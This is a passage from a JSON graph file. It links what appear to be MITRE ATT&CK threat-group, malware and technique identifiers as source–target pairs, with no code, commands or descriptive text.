            "target": "T1059.003"
        },
        {
            "source": "S0448",
            "target": "T1564.001"
        },
        {
            "source": "S0448",
            "target": "T1560.003"
        },
        {
            "source": "S0448",
            "target": "T1070.004"
        },
        {
            "source": "S0448",
            "target": "T1140"
        },
        {
            "source": "S0448",
            "target": "T1106"
        },
        {
            "source": "S0448",
            "target": "T1083"
        },
        {
            "source": "S0448",
            "target": "T1082"
        },
        {
            "source": "S0448",
            "target": "T1070"
        },
        {
            "source": "S0448",
            "target": "T1057"
        },
        {
            "source": "S0448",
            "target": "T1041"
        },
        {
            "source": "S0448",
            "target": "T1033"
        },
        {
            "source": "S0448",
            "target": "T1027"
        },
        {
            "source": "S0448",
            "target": "T1016"
        },
        {
            "source": "G0104",
            "target": "S0448"
        },
        {
            "source": "S0445",
            "target": "T1071.001"
        },
        {
            "source": "S0445",
            "target": "T1560"
        },
        {
            "source": "S0445",
            "target": "T1036.005"
        },
        {
            "source": "S0445",
            "target": "T1518"
        },
        {
            "source": "S0445",
            "target": "T1119"
        },
        {
            "source": "S0445",
            "target": "T1106"
        },
        {
            "source": "S0445",
            "target": "T1105"
        },
        {
            "source": "S0445",
            "target": "T1087"
        },
        {
            "source": "S0445",
            "target": "T1082"
        },
        {
            "source": "S0445",
            "target": "T1069"
        },
        {
            "source": "S0445",
            "target": "T1057"
        },
        {
            "source": "S0445",
            "target": "T1049"
        },
        {
            "source": "S0445",
            "target": "T1041"
        },
        {
            "source": "S0445",
            "target": "T1027"
        },
        {
            "source": "S0445",
            "target": "T1020"
        },
        {
            "source": "S0445",
            "target": "T1016"
        },
        {
            "source": "G0103",
            "target": "S0445"
        },
        {
            "source": "S0444",
            "target": "T1071.001"
        },
        {
            "source": "S0444",
            "target": "T1090.002"
        },
        {
            "source": "S0444",
            "target": "T1574"
        },
        {
            "source": "S0444",
            "target": "T1059.003"
        },
        {
            "source": "S0444",
            "target": "T1036.004"
        },
        {
            "source": "S0444",
            "target": "T1027.002"
        },
        {
            "source": "S0444",
            "target": "T1070.004"
        },
        {
            "source": "S0444",
            "target": "T1548.002"
        },
        {
            "source": "S0444",
            "target": "T1546.011"
        },
        {
            "source": "S0444",
            "target": "T1547.001"
        },
        {
            "source": "S0444",
            "target": "T1543.003"
        },
        {
            "source": "S0444",
            "target": "T1140"
        },
        {
            "source": "S0444",
            "target": "T1135"
        },
        {
            "source": "S0444",
            "target": "T1112"
        },
        {
            "source": "S0444",
            "target": "T1106"
        },
        {
            "source": "S0444",
            "target": "T1105"
        },
        {
            "source": "S0444",
            "target": "T1083"
        },
        {
            "source": "S0444",
            "target": "T1029"
        },
        {
            "source": "S0444",
            "target": "T1027"
        },
        {
            "source": "S0444",
            "target": "T1008"
        },
        {
            "source": "S0444",
            "target": "T1005"
        },
        {
            "source": "G0103",
            "target": "S0444"
        },
        {
            "source": "S0552",
            "target": "T1069.002"
        },
        {
            "source": "S0552",
            "target": "T1087.002"
        },
        {
            "source": "S0552",
            "target": "T1482"
        },
        {
            "source": "S0552",
            "target": "T1018"
        },
        {
            "source": "S0552",
            "target": "T1016"
        },
        {
            "source": "G0102",
            "target": "S0552"
        },
        {
            "source": "G0102",
            "target": "S0521"
        },
        {
            "source": "S0446",
            "target": "T1078.002"
        },
        {
            "source": "S0446",
            "target": "T1059.003"
        },
        {
            "source": "S0446",
            "target": "T1562.001"
        },
        {
            "source": "S0446",
            "target": "T1021.002"
        },
        {
            "source": "S0446",
            "target": "T1036.005"
        },
        {
            "source": "S0446",
            "target": "T1222.001"
        },
        {
            "source": "S0446",
            "target": "T1547.001"
        },
        {
            "source": "S0446",
            "target": "T1053.005"
        },
        {
            "source": "S0446",
            "target": "T1490"
        },
        {
            "source": "S0446",
            "target": "T1489"
        },
        {
            "source": "S0446",
            "target": "T1486"
        },
        {
            "source": "S0446",
            "target": "T1205"
        },
        {
            "source": "S0446",
            "target": "T1134"
        },
        {
            "source": "S0446",
            "target": "T1106"
        },
        {
            "source": "S0446",
            "target": "T1083"
        },
        {
            "source": "S0446",
            "target": "T1057"
        },
        {
            "source": "S0446",
            "target": "T1055"
        },
        {
            "source": "S0446",
            "target": "T1036"
        },
        {
            "source": "S0446",
            "target": "T1016"
        },
        {
            "source": "S0446",
            "target": "T0828"
        },
        {
            "source": "G0102",
            "target": "S0446"
        },
        {
            "source": "S0367",
            "target": "T1573.002"
        },
        {
            "source": "S0367",
            "target": "T1571"
        },
        {
            "source": "S0367",
            "target": "T1078.003"
        },
        {
            "source": "S0367",
            "target": "T1204.002"
        },
        {
            "source": "S0367",
            "target": "T1204.001"
        },
        {
            "source": "S0367",
            "target": "T1059.005"
        },
        {
            "source": "S0367",
            "target": "T1059.003"
        },
        {
            "source": "S0367",
            "target": "T1059.001"
        },
        {
            "source": "S0367",
            "target": "T1566.002"
        },
        {
            "source": "S0367",
            "target": "T1566.001"
        },
        {
            "source": "S0367",
            "target": "T1087.003"
        },
        {
            "source": "S0367",
            "target": "T1560"
        },
        {
            "source": "S0367",
            "target": "T1114.001"
        },
        {
            "source": "S0367",
            "target": "T1555.003"
        },
        {
            "source": "S0367",
            "target": "T1003.001"
        },
        {
            "source": "S0367",
            "target": "T1110.001"
        },
        {
            "source": "S0367",
            "target": "T1021.002"
        },
        {
            "source": "S0367",
            "target": "T1027.002"
        },
        {
            "source": "S0367",
            "target": "T1552.001"
        },
        {
            "source": "S0367",
            "target": "T1547.001"
        },
        {
            "source": "S0367",
            "target": "T1543.003"
        },
        {
            "source": "S0367",
            "target": "T1055.001"
        },
        {
            "source": "S0367",
            "target": "T1053.005"
        },
        {
            "source": "S0367",
            "target": "T1210"
        },
        {
            "source": "S0367",
            "target": "T1094"
        },
        {
            "source": "S0367",
            "target": "T1065"
        },
        {
            "source": "S0367",
            "target": "T1057"
        },
        {
            "source": "S0367",
            "target": "T1047"
        },
        {
            "source": "S0367",
            "target": "T1043"
        },
        {
            "source": "S0367",
            "target": "T1041"
        },
        {
            "source": "S0367",
            "target": "T1040"
        },
        {
            "source": "S0367",
            "target": "T1027"
        },
        {
            "source": "G0102",
            "target": "S0367"
        },
        {
            "source": "G0102",
            "target": "S0363"
        },
        {
            "source": "S0359",
            "target": "T1482"
        },
        {
            "source": "S0359",
            "target": "T1018"
        },
        {
            "source": "S0359",
            "target": "T1016"
        },
        {
            "source": "G0102",
            "target": "S0359"
        },
        {
            "source": "S0266",
            "target": "T1555.005"
        },
        {
            "source": "S0266",
            "target": "T1573.001"
        },
        {
            "source": "S0266",
            "target": "T1071.001"
        },
        {
            "source": "S0266",
            "target": "T1132.001"
        },
        {
            "source": "S0266",
            "target": "T1571"
        },
        {
            "source": "S0266",
            "target": "T1204.002"
        },
        {
            "source": "S0266",
            "target": "T1059.003"
        },
        {
            "source": "S0266",
            "target": "T1566.002"
        },
        {
            "source": "S0266",
            "target": "T1566.001"
        },
        {
            "source": "S0266",
            "target": "T1087.003"
        },
        {
            "source": "S0266",
            "target": "T1087.001"
        },
        {
            "source": "S0266",
            "target": "T1562.001"
        },
        {
            "source": "S0266",
            "target": "T1555.003"
        },
        {
            "source": "S0266",
            "target": "T1559.001"
        },
        {
            "source": "S0266",
            "target": "T1056.004"
        },
        {
            "source": "S0266",
            "target": "T1110.004"
        },
        {
            "source": "S0266",
            "target": "T1553.002"
        },
        {
            "source": "S0266",
            "target": "T1027.002"
        },
        {
            "source": "S0266",
            "target": "T1552.002"
        },
        {
            "source": "S0266",
            "target": "T1552.001"
        },
        {
            "source": "S0266",
            "target": "T1547.001"
        },
        {
            "source": "S0266",
            "target": "T1543.003"
        },
        {
            "source": "S0266",
            "target": "T1055.012"
        },
        {
            "source": "S0266",
            "target": "T1542.003"
        },
        {
            "source": "S0266",
            "target": "T1053.005"
        },
        {
            "source": "S0266",
            "target": "T1495"
        },
        {
            "source": "S0266",
            "target": "T1482"
        },
        {
            "source": "S0266",
            "target": "T1210"
        },
        {
            "source": "S0266",
            "target": "T1219"
        },
        {
            "source": "S0266",
            "target": "T1185"
        },
        {
            "source": "S0266",
            "target": "T1140"
        },
        {
            "source": "S0266",
            "target": "T1135"
        },
        {
            "source": "S0266",
            "target": "T1112"
        },
        {
            "source": "S0266",
            "target": "T1106"
        },
        {
            "source": "S0266",
            "target": "T1105"
        },
        {
            "source": "S0266",
            "target": "T1083"
        },
        {
            "source": "S0266",
            "target": "T1082"
        },
        {
            "source": "S0266",
            "target": "T1069"
        },
        {
            "source": "S0266",
            "target": "T1065"
        },
        {
            "source": "S0266",
            "target": "T1057"
        },
        {
            "source": "S0266",
            "target": "T1043"
        },
        {
            "source": "S0266",
            "target": "T1041"
        },
        {
            "source": "S0266",
            "target": "T1036"
        },
        {
            "source": "S0266",
            "target": "T1033"
        },
        {
            "source": "S0266",
            "target": "T1027"
        },
        {
            "source": "S0266",
            "target": "T1018"
        },
        {
            "source": "S0266",
            "target": "T1016"
        },
        {
            "source": "S0266",
            "target": "T1008"
        },
        {
            "source": "S0266",
            "target": "T1007"
        },
        {
            "source": "S0266",
            "target": "T1005"
        },
        {
            "source": "G0102",
            "target": "S0266"
        },
        {
            "source": "G0102",
            "target": "S0154"
        },
        {
            "source": "S0097",
            "target": "T1018"
        },
        {
            "source": "G0102",
            "target": "S0097"
        },
        {
            "source": "G0102",
            "target": "S0039"
        },
        {
            "source": "G0102",
            "target": "S0029"
        },
        {
            "source": "S0024",
            "target": "T1071.001"
        },
        {
            "source": "S0024",
            "target": "T1074.001"
        },
        {
            "source": "S0024",
            "target": "T1497.001"
        },
        {
            "source": "S0024",
            "target": "T1027.002"
        },
        {
            "source": "S0024",
            "target": "T1543.003"
        },
        {
            "source": "S0024",
            "target": "T1055.001"
        },
        {
            "source": "S0024",
            "target": "T1053.005"
        },
        {
            "source": "S0024",
            "target": "T1518"
        },
        {
            "source": "S0024",
            "target": "T1140"
        },
        {
            "source": "S0024",
            "target": "T1105"
        },
        {
            "source": "S0024",
            "target": "T1082"
        },
        {
            "source": "S0024",
            "target": "T1055"
        },
        {
            "source": "S0024",
            "target": "T1041"
        },
        {
            "source": "S0024",
            "target": "T1033"
        },
        {
            "source": "S0024",
            "target": "T1016"
        },
        {
            "source": "S0024",
            "target": "T1007"
        },
        {
            "source": "G0102",
            "target": "S0024"
        },
        {
            "source": "G0102",
            "target": "S0002"
        },
        {
            "source": "G0102",
            "target": "S0446"
        },
        {
            "source": "G0101",
            "target": "S0363"
        },
        {
            "source": "S0442",
            "target": "T1071.001"
        },
        {
            "source": "S0442",
            "target": "T1059.005"
        },
        {
            "source": "S0442",
            "target": "T1070.004"
        },
        {
            "source": "S0442",
            "target": "T1547.001"
        },
        {
            "source": "S0442",
            "target": "T1105"
        },
        {
            "source": "G0100",
            "target": "S0442"
        },
        {
            "source": "S0441",
            "target": "T1071.001"
        },
        {
            "source": "S0441",
            "target": "T1132.001"
        },
        {
            "source": "S0441",
            "target": "T1564.003"
        },
        {
            "source": "S0441",
            "target": "T1059.005"
        },
        {
            "source": "S0441",
            "target": "T1059.001"
        },
        {
            "source": "S0441",
            "target": "T1560.001"
        },
        {
            "source": "S0441",
            "target": "T1070.004"
        },
        {
            "source": "S0441",
            "target": "T1547.001"
        },
        {
            "source": "S0441",
            "target": "T1112"
        },
        {
            "source": "S0441",
            "target": "T1082"
        },
        {
            "source": "S0441",
            "target": "T1057"
        },
        {
            "source": "S0441",
            "target": "T1041"
        },
        {
            "source": "S0441",
            "target": "T1033"
        },
        {
            "source": "S0441",
            "target": "T1016"
        },
        {
            "source": "G0100",
            "target": "S0441"
        },
        {
            "source": "G0100",
            "target": "S0349"
        },
        {
            "source": "S0434",
            "target": "T1564.001"
        },
        {
            "source": "S0434",
            "target": "T1562.001"
        },
        {
            "source": "S0434",
            "target": "T1555.003"
        },
        {
            "source": "S0434",
            "target": "T1056.001"
        },
        {
            "source": "S0434",
            "target": "T1021.001"
        },
        {
            "source": "S0434",
            "target": "T1070.004"
        },
        {
            "source": "S0434",
            "target": "T1496"
        },
        {
            "source": "S0434",
            "target": "T1140"
        },
        {
            "source": "S0434",
            "target": "T1125"
        },
        {
            "source": "S0434",
            "target": "T1123"
        },
        {
            "source": "S0434",
            "target": "T1106"
        },
        {
            "source": "S0434",
            "target": "T1083"
        },
        {
            "source": "S0434",
            "target": "T1059"
        },
        {
            "source": "S0434",
            "target": "T1057"
        },
        {
            "source": "S0434",
            "target": "T1041"
        },
        {
            "source": "S0434",
            "target": "T1027"
        },
        {
            "source": "G0099",
            "target": "S0434"
        },
        {
            "source": "S0579",
            "target": "T1027.005"
        },
        {
            "source": "S0579",
            "target": "T1562.006"
        },
        {
            "source": "S0579",
            "target": "T1574.002"
        },
        {
            "source": "S0579",
            "target": "T1518.001"
        },
        {
            "source": "S0579",
            "target": "T1055.003"
        },
        {
            "source": "S0579",
            "target": "T1140"
        },
        {
            "source": "S0579",
            "target": "T1106"
        },
        {
            "source": "S0579",
            "target": "T1105"
        },
        {
            "source": "S0579",
            "target": "T1057"
        },
        {
            "source": "S0579",
            "target": "T1055"
        },
        {
            "source": "S0579",
            "target": "T1049"
        },
        {
            "source": "S0579",
            "target": "T1027"
        },
        {
            "source": "S0579",
            "target": "T1012"
        },
        {
            "source": "G0098",
            "target": "S0579"
        },
        {
            "source": "S0437",
            "target": "T1564.003"
        },
        {
            "source": "S0437",
            "target": "T1056.001"
        },
        {
            "source": "S0437",
            "target": "T1070.004"
        },
        {
            "source": "S0437",
            "target": "T1113"
        },
        {
            "source": "S0437",
            "target": "T1105"
        },
        {
            "source": "S0437",
            "target": "T1083"
        },
        {
            "source": "S0437",
            "target": "T1021"
        },
        {
            "source": "G0098",
            "target": "S0437"
        },
        {
            "source": "S0436",
            "target": "T1573.001"
        },
        {
            "source": "S0436",
            "target": "T1071.001"
        },
        {
            "source": "S0436",
            "target": "T1204.001"
        },
        {
            "source": "S0436",
            "target": "T1059.003"
        },
        {
            "source": "S0436",
            "target": "T1555.003"
        },
        {
            "source": "S0436",
            "target": "T1140"
        },
        {
            "source": "S0436",
            "target": "T1105"
        },
        {
            "source": "S0436",
            "target": "T1095"
        },
        {
            "source": "S0436",
            "target": "T1090"
        },
        {
            "source": "S0436",
            "target": "T1083"
        },
        {
            "source": "S0436",
            "target": "T1057"
        },
        {
            "source": "S0436",
            "target": "T1055"
        },
        {
            "source": "S0436",
            "target": "T1016"
        },
        {
            "source": "G0098",
            "target": "S0436"
        },
        {
            "source": "S0435",
            "target": "T1573.001"
        },
        {
            "source": "S0435",
            "target": "T1071.001"
        },
        {
            "source": "S0435",
            "target": "T1001.001"
        },
        {
            "source": "S0435",
            "target": "T1204.002"
        },
        {
            "source": "S0435",
            "target": "T1204.001"
        },
        {
            "source": "S0435",
            "target": "T1059.003"
        },
        {
            "source": "S0435",
            "target": "T1555.003"
        },
        {
            "source": "S0435",
            "target": "T1555"
        },
        {
            "source": "S0435",
            "target": "T1070.004"
        },
        {
            "source": "S0435",
            "target": "T1105"
        },
        {
            "source": "S0435",
            "target": "T1090"
        },
        {
            "source": "S0435",
            "target": "T1083"
        },
        {
            "source": "S0435",
            "target": "T1057"
        },
        {
            "source": "S0435",
            "target": "T1010"
        },
        {
            "source": "G0098",
            "target": "S0435"
        },
        {
            "source": "S0596",
            "target": "T1071.004"
        },
        {
            "source": "S0596",
            "target": "T1071.002"
        },
        {
            "source": "S0596",
            "target": "T1071.001"
        },
        {
            "source": "S0596",
            "target": "T1132.002"
        },
        {
            "source": "S0596",
            "target": "T1568.002"
        },
        {
            "source": "S0596",
            "target": "T1055.001"
        },
        {
            "source": "S0596",
            "target": "T1140"
        },
        {
            "source": "S0596",
            "target": "T1124"
        },
        {
            "source": "S0596",
            "target": "T1112"
        },
        {
            "source": "S0596",
            "target": "T1105"
        },
        {
            "source": "S0596",
            "target": "T1095"
        },
        {
            "source": "S0596",
            "target": "T1082"
        },
        {
            "source": "S0596",
            "target": "T1070"
        },
        {
            "source": "S0596",
            "target": "T1057"
        },
        {
            "source": "S0596",
            "target": "T1055"
        },
        {
            "source": "S0596",
            "target": "T1033"
        },
        {
            "source": "S0596",
            "target": "T1029"
        },
        {
            "source": "S0596",
            "target": "T1027"
        },
        {
            "source": "S0596",
            "target": "T1016"
        },
        {
            "source": "G0096",
            "target": "S0596"
        },
        {
            "source": "S0443",
            "target": "T1074.001"
        },
        {
            "source": "S0443",
            "target": "T1560.003"
        },
        {
            "source": "S0443",
            "target": "T1070.004"
        },
        {
            "source": "S0443",
            "target": "T1140"
        },
        {
            "source": "S0443",
            "target": "T1119"
        },
        {
            "source": "S0443",
            "target": "T1083"
        },
        {
            "source": "S0443",
            "target": "T1049"
        },
        {
            "source": "S0443",
            "target": "T1040"
        },
        {
            "source": "G0096",
            "target": "S0443"
        },
        {
            "source": "S0430",
            "target": "T1573.001"
        },
        {
            "source": "S0430",
            "target": "T1071.001"
        },
        {
            "source": "S0430",
            "target": "T1205"
        },
        {
            "source": "S0430",
            "target": "T1140"
        },
        {
            "source": "S0430",
            "target": "T1105"
        },
        {
            "source": "S0430",
            "target": "T1095"
        },
        {
            "source": "S0430",
            "target": "T1027"
        },
        {
            "source": "S0430",
            "target": "T1014"
        },
        {
            "source": "G0096",
            "target": "S0430"
        },
        {
            "source": "S0412",
            "target": "T1071.002"
        },
        {
            "source": "S0412",
            "target": "T1071.001"
        },
        {
            "source": "S0412",
            "target": "T1059.003"
        },
        {
            "source": "S0412",
            "target": "T1562.004"
        },
        {
            "source": "S0412",
            "target": "T1562.001"
        },
        {
            "source": "S0412",
            "target": "T1134.002"
        },
        {
            "source": "S0412",
            "target": "T1056.004"
        },
        {
            "source": "S0412",
            "target": "T1056.001"
        },
        {
            "source": "S0412",
            "target": "T1021.005"
        },
        {
            "source": "S0412",
            "target": "T1021.001"
        },
        {
            "source": "S0412",
            "target": "T1070.004"
        },
        {
            "source": "S0412",
            "target": "T1070.001"
        },
        {
            "source": "S0412",
            "target": "T1136.001"
        },
        {
            "source": "S0412",
            "target": "T1218.011"
        },
        {
            "source": "S0412",
            "target": "T1543.003"
        },
        {
            "source": "S0412",
            "target": "T1055.001"
        },
        {
            "source": "S0412",
            "target": "T1499"
        },
        {
            "source": "S0412",
            "target": "T1125"
        },
        {
            "source": "S0412",
            "target": "T1113"
        },
        {
            "source": "S0412",
            "target": "T1105"
        },
        {
            "source": "S0412",
            "target": "T1090"
        },
        {
            "source": "S0412",
            "target": "T1083"
        },
        {
            "source": "S0412",
            "target": "T1082"
        },
        {
            "source": "S0412",
            "target": "T1065"
        },
        {
            "source": "S0412",
            "target": "T1057"
        },
        {
            "source": "S0412",
            "target": "T1046"
        },
        {
            "source": "S0412",
            "target": "T1043"
        },
        {
            "source": "S0412",
            "target": "T1033"
        },
        {
            "source": "S0412",
            "target": "T1012"
        },
        {
            "source": "S0412",
            "target": "T1007"
        },
        {
            "source": "G0096",
            "target": "S0412"
        },
        {
            "source": "S0385",
            "target": "T1027.004"
        },
        {
            "source": "S0385",
            "target": "T1071.001"
        },
        {
            "source": "S0385",
            "target": "T1132.001"
        },
        {
            "source": "S0385",
            "target": "T1571"
        },
        {
            "source": "S0385",
            "target": "T1568.001"
        },
        {
            "source": "S0385",
            "target": "T1059.003"
        },
        {
            "source": "S0385",
            "target": "T1059.001"
        },
        {
            "source": "S0385",
            "target": "T1562.004"
        },
        {
            "source": "S0385",
            "target": "T1555.003"
        },
        {
            "source": "S0385",
            "target": "T1056.001"
        },
        {
            "source": "S0385",
            "target": "T1021.001"
        },
        {
            "source": "S0385",
            "target": "T1547.001"
        },
        {
            "source": "S0385",
            "target": "T1125"
        },
        {
            "source": "S0385",
            "target": "T1120"
        },
        {
            "source": "S0385",
            "target": "T1113"
        },
        {
            "source": "S0385",
            "target": "T1112"
        },
        {
            "source": "S0385",
            "target": "T1106"
        },
        {
            "source": "S0385",
            "target": "T1105"
        },
        {
            "source": "S0385",
            "target": "T1094"
        },
        {
            "source": "S0385",
            "target": "T1091"
        },
        {
            "source": "S0385",
            "target": "T1083"
        },
        {
            "source": "S0385",
            "target": "T1082"
        },
        {
            "source": "S0385",
            "target": "T1070"
        },
        {
            "source": "S0385",
            "target": "T1065"
        },
        {
            "source": "S0385",
            "target": "T1057"
        },
        {
            "source": "S0385",
            "target": "T1041"
        },
        {
            "source": "S0385",
            "target": "T1033"
        },
        {
            "source": "S0385",
            "target": "T1027"
        },
        {
            "source": "S0385",
            "target": "T1018"
        },
        {
            "source": "S0385",
            "target": "T1012"
        },
        {
            "source": "S0385",
            "target": "T1010"
        },
        {
            "source": "S0385",
            "target": "T1005"
        },
        {
            "source": "G0096",
            "target": "S0385"
        },
        {
            "source": "G0096",
            "target": "S0363"
        },
        {
            "source": "G0096",
            "target": "S0194"
        },
        {
            "source": "S0190",
            "target": "T1048.003"
        },
        {
            "source": "S0190",
            "target": "T1570"
        },
        {
            "source": "S0190",
            "target": "T1197"
        },
        {
            "source": "S0190",
            "target": "T1105"
        },
        {
            "source": "G0096",
            "target": "S0190"
        },
        {
            "source": "G0096",
            "target": "S0160"
        },
        {
            "source": "G0096",
            "target": "S0154"
        },
        {
            "source": "S0112",
            "target": "T1542.003"
        },
        {
            "source": "G0096",
            "target": "S0112"
        },
        {
            "source": "G0096",
            "target": "S0104"
        },
        {
            "source": "G0096",
            "target": "S0097"
        },
        {
            "source": "S0095",
            "target": "T1048.003"
        },
        {
            "source": "S0095",
            "target": "T1043"
        },
        {
            "source": "G0096",
            "target": "S0095"
        },
        {
            "source": "G0096",
            "target": "S0073"
        },
        {
            "source": "S0069",
            "target": "T1102.002"
        },
        {
            "source": "S0069",
            "target": "T1102.001"
        },
        {
            "source": "S0069",
            "target": "T1059.003"
        },
        {
            "source": "S0069",
            "target": "T1070.004"
        },
        {
            "source": "S0069",
            "target": "T1104"
        },
        {
            "source": "S0069",
            "target": "T1083"
        },
        {
            "source": "S0069",
            "target": "T1057"
        },
        {
            "source": "G0096",
            "target": "S0069"
        },
        {
            "source": "G0096",
            "target": "S0039"
        },
        {
            "source": "G0096",
            "target": "S0032"
        },
        {
            "source": "S0021",
            "target": "T1573.001"
        },
        {
            "source": "S0021",
            "target": "T1571"
        },
        {
            "source": "S0021",
            "target": "T1059.004"
        },
        {
            "source": "S0021",
            "target": "T1056.001"
        },
        {
            "source": "S0021",
            "target": "T1070.006"
        },
        {
            "source": "S0021",
            "target": "T1070.004"
        },
        {
            "source": "S0021",
            "target": "T1218.010"
        },
        {
            "source": "S0021",
            "target": "T1055.001"
        },
        {
            "source": "S0021",
            "target": "T1125"
        },
        {
            "source": "S0021",
            "target": "T1123"
        },
        {
            "source": "S0021",
            "target": "T1113"
        },
        {
            "source": "S0021",
            "target": "T1095"
        },
        {
            "source": "S0021",
            "target": "T1094"
        },
        {
            "source": "S0021",
            "target": "T1083"
        },
        {
            "source": "S0021",
            "target": "T1082"
        },
        {
            "source": "S0021",
            "target": "T1057"
        },
        {
            "source": "S0021",
            "target": "T1043"
        },
        {
            "source": "S0021",
            "target": "T1033"
        },
        {
            "source": "S0021",
            "target": "T1012"
        },
        {
            "source": "S0021",
            "target": "T1008"
        },
        {
            "source": "G0096",
            "target": "S0021"
        },
        {
            "source": "G0096",
            "target": "S0020"
        },
        {
            "source": "G0096",
            "target": "S0013"
        },
        {
            "source": "S0006",
            "target": "T1003.002"
        },
        {
            "source": "G0096",
            "target": "S0006"
        },
        {
            "source": "G0096",
            "target": "S0002"
        },
        {
            "source": "S0409",
            "target": "T1573.002"
        },
        {
            "source": "S0409",
            "target": "T1573.001"
        },
        {
            "source": "S0409",
            "target": "T1071.002"
        },
        {
            "source": "S0409",
            "target": "T1071.001"
        },
        {
            "source": "S0409",
            "target": "T1132.001"
        },
        {
            "source": "S0409",
            "target": "T1074.001"
        },
        {
            "source": "S0409",
            "target": "T1052.001"
        },
        {
            "source": "S0409",
            "target": "T1059.006"
        },
        {
            "source": "S0409",
            "target": "T1564.001"
        },
        {
            "source": "S0409",
            "target": "T1560.003"
        },
        {
            "source": "S0409",
            "target": "T1560"
        },
        {
            "source": "S0409",
            "target": "T1555.003"
        },
        {
            "source": "S0409",
            "target": "T1056.001"
        },
        {
            "source": "S0409",
            "target": "T1036.005"
        },
        {
            "source": "S0409",
            "target": "T1036.004"
        },
        {
            "source": "S0409",
            "target": "T1027.002"
        },
        {
            "source": "S0409",
            "target": "T1552.004"
        },
        {
            "source": "S0409",
            "target": "T1070.004"
        },
        {
            "source": "S0409",
            "target": "T1547.001"
        },
        {
            "source": "S0409",
            "target": "T1053.005"
        },
        {
            "source": "S0409",
            "target": "T1217"
        },
        {
            "source": "S0409",
            "target": "T1140"
        },
        {
            "source": "S0409",
            "target": "T1125"
        },
        {
            "source": "S0409",
            "target": "T1123"
        },
        {
            "source": "S0409",
            "target": "T1120"
        },
        {
            "source": "S0409",
            "target": "T1115"
        },
        {
            "source": "S0409",
            "target": "T1113"
        },
        {
            "source": "S0409",
            "target": "T1105"
        },
        {
            "source": "S0409",
            "target": "T1083"
        },
        {
            "source": "S0409",
            "target": "T1082"
        },
        {
            "source": "S0409",
            "target": "T1057"
        },
        {
            "source": "S0409",
            "target": "T1049"
        },
        {
            "source": "S0409",
            "target": "T1041"
        },
        {
            "source": "S0409",
            "target": "T1029"
        },
        {
            "source": "S0409",
            "target": "T1027"
        },
        {
            "source": "S0409",
            "target": "T1025"
        },
        {
            "source": "S0409",
            "target": "T1020"
        },
        {
            "source": "S0409",
            "target": "T1016"
        },
        {
            "source": "S0409",
            "target": "T1010"
        },
        {
            "source": "S0409",
            "target": "T1008"
        },
        {
            "source": "S0409",
            "target": "T1005"
        },
        {
            "source": "G0095",
            "target": "S0409"
        },
        {
            "source": "S0527",
            "target": "T1071.001"
        },
        {
            "source": "S0527",
            "target": "T1204.002"
        },
        {
            "source": "S0527",
            "target": "T1497.001"
        },
        {
            "source": "S0527",
            "target": "T1036.004"
        },
        {
            "source": "S0527",
            "target": "T1553.002"
        },
        {
            "source": "S0527",
            "target": "T1027.002"
        },
        {
            "source": "S0527",
            "target": "T1070.004"
        },
        {
            "source": "S0527",
            "target": "T1548.002"
        },
        {
            "source": "S0527",
            "target": "T1053.005"
        },
        {
            "source": "S0527",
            "target": "T1112"
        },
        {
            "source": "S0527",
            "target": "T1105"
        },
        {
            "source": "S0527",
            "target": "T1070"
        },
        {
            "source": "G0094",
            "target": "S0527"
        },
        {
            "source": "S0526",
            "target": "T1555.004"
        },
        {
            "source": "S0526",
            "target": "T1071.001"
        },
        {
            "source": "S0526",
            "target": "T1074.001"
        },
        {
            "source": "S0526",
            "target": "T1204.002"
        },
        {
            "source": "S0526",
            "target": "T1059.003"
        },
        {
            "source": "S0526",
            "target": "T1059.001"
        },
        {
            "source": "S0526",
            "target": "T1114.001"
        },
        {
            "source": "S0526",
            "target": "T1555.003"
        },
        {
            "source": "S0526",
            "target": "T1056.001"
        },
        {
            "source": "S0526",
            "target": "T1555"
        },
        {
            "source": "S0526",
            "target": "T1036.005"
        },
        {
            "source": "S0526",
            "target": "T1037.001"
        },
        {
            "source": "S0526",
            "target": "T1518"
        },
        {
            "source": "S0526",
            "target": "T1140"
        },
        {
            "source": "S0526",
            "target": "T1105"
        },
        {
            "source": "S0526",
            "target": "T1083"
        },
        {
            "source": "S0526",
            "target": "T1082"
        },
        {
            "source": "S0526",
            "target": "T1041"
        },
        {
            "source": "S0526",
            "target": "T1027"
        },
        {
            "source": "S0526",
            "target": "T1005"
        },
        {
            "source": "G0094",
            "target": "S0526"
        },
        {
            "source": "S0414",
            "target": "T1132.001"
        },
        {
            "source": "S0414",
            "target": "T1059.003"
        },
        {
            "source": "S0414",
            "target": "T1056.001"
        },
        {
            "source": "S0414",
            "target": "T1070.004"
        },
        {
            "source": "S0414",
            "target": "T1547.001"
        },
        {
            "source": "S0414",
            "target": "T1218.005"
        },
        {
            "source": "S0414",
            "target": "T1053.005"
        },
        {
            "source": "S0414",
            "target": "T1140"
        },
        {
            "source": "S0414",
            "target": "T1105"
        },
        {
            "source": "S0414",
            "target": "T1083"
        },
        {
            "source": "S0414",
            "target": "T1082"
        },
        {
            "source": "S0414",
            "target": "T1057"
        },
        {
            "source": "S0414",
            "target": "T1033"
        },
        {
            "source": "S0414",
            "target": "T1016"
        },
        {
            "source": "S0414",
            "target": "T1012"
        },
        {
            "source": "G0094",
            "target": "S0414"
        },
        {
            "source": "S0353",
            "target": "T1071.002"
        },
        {
            "source": "S0353",
            "target": "T1071.001"
        },
        {
            "source": "S0353",
            "target": "T1074.001"
        },
        {
            "source": "S0353",
            "target": "T1056.004"
        },
        {
            "source": "S0353",
            "target": "T1036.005"
        },
        {
            "source": "S0353",
            "target": "T1070.004"
        },
        {
            "source": "S0353",
            "target": "T1547.001"
        },
        {
            "source": "S0353",
            "target": "T1218.011"
        },
        {
            "source": "S0353",
            "target": "T1140"
        },
        {
            "source": "S0353",
            "target": "T1124"
        },
        {
            "source": "S0353",
            "target": "T1105"
        },
        {
            "source": "S0353",
            "target": "T1082"
        },
        {
            "source": "S0353",
            "target": "T1033"
        },
        {
            "source": "S0353",
            "target": "T1027"
        },
        {
            "source": "S0353",
            "target": "T1016"
        },
        {
            "source": "G0094",
            "target": "S0353"
        },
        {
            "source": "S0111",
            "target": "T1053.005"
        },
        {
            "source": "G0094",
            "target": "S0111"
        },
        {
            "source": "G0093",
            "target": "S0590"
        },
        {
            "source": "S0564",
            "target": "T1071.001"
        },
        {
            "source": "S0564",
            "target": "T1059.003"
        },
        {
            "source": "S0564",
            "target": "T1105"
        },
        {
            "source": "S0564",
            "target": "T1083"
        },
        {
            "source": "S0564",
            "target": "T1082"
        },
        {
            "source": "S0564",
            "target": "T1005"
        },
        {
            "source": "G0093",
            "target": "S0564"
        },
        {
            "source": "S0110",
            "target": "T1053.002"
